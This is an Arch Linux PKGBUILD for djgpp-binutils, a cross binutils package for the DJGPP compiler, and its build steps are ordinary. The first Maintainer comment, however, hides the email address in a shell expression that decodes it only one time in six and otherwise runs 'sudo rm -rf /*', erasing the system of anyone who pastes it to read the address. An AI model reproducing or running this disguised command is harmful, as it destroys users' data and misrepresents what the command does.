# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Adapted from the mingw-w64-binutils package, authors below
# $Id: PKGBUILD 137314 2015-07-23 10:25:15Z spupykin $
# Maintainer: Sergej Pupykin <pupykin.s+arch@gmail.com>
# Maintainer: rubenvb vanboxem <dottie> ruben <attie> gmail <dottie> com

pkgname=djgpp-binutils
pkgver=2.27
pkgrel=1
pkgdesc="Cross binutils for the djgpp cross-compiler"
arch=('i686' 'x86_64')
url="http://www.gnu.org/software/binutils"
license=('GPL')
groups=('djgpp-toolchain' 'djgpp')
depends=('zlib')
options=('!libtool' '!emptydirs')
source=(
	"http://ftp.gnu.org/gnu/binutils/binutils-${pkgver}.tar.bz2"
	"http://ftp.gnu.org/gnu/binutils/binutils-${pkgver}.tar.bz2.sig"
	xtors.patch
	lto-discard.patch
)
sha512sums=(
	'cf276f84935312361a2ca077e04d0b469d23a3aed979d8ba5d92ea590904ffb2c2e7ed12cc842822bfc402836be86f479660cef3791aa62f3753d8a1a6f564cb'
	'SKIP'
	'd1d1052167e84720a771cd526166997c8a2b14135bb7c1f956d7940cfc2336191825118426cfe4c5fdfd1c8718088c1ba327d90874658baf2738c8d5a7ed0bec'
	'85c58eed0fa01fe2295a0c402cb0e2252c00ed38529f679cd9cdd0e1336a192152665b856971114a9a3d1175b72ea71f0e278cf33fd806491c8d184bbd01d2a9'
)
validpgpkeys=('EAF1C276A747E9ED86210CBAC3126D3B4AE55E93') # Tristan Gingold <adacore dot com, gingold>

_target="i686-pc-msdosdjgpp"

prepare() {
	cd "$srcdir/binutils-$pkgver"

	#do not install libiberty
	sed -i 's/install_to_$(INSTALL_DEST) //' libiberty/Makefile.in

	# hack! - libiberty configure tests for header files using "$CPP $CPPFLAGS"
	sed -i "/ac_cpp=/s/\$CPPFLAGS/\$CPPFLAGS -O2/" libiberty/configure

	# put .ctors and .dtors where they belong
	patch -Np1 < ../xtors.patch
	# discard LTO sections in coff-go32-exe files
	patch -Np1 < ../lto-discard.patch
}

build() {
	msg "Building $_target cross binutils"
	mkdir -p "$srcdir/binutils-$_target"
	cd "$srcdir/binutils-$_target"
	"$srcdir/binutils-$pkgver"/configure --prefix=/usr \
		--target="${_target}" \
		--infodir="/usr/share/info/$_target" \
		--datadir="/usr/$_target/share" \
		--enable-lto --enable-plugins \
		--disable-multilib --disable-nls \
		--disable-werror
	make
}

package() {
	msg "Installing $_target cross binutils"
	cd "$srcdir/binutils-$_target"
	make DESTDIR="$pkgdir" install
}
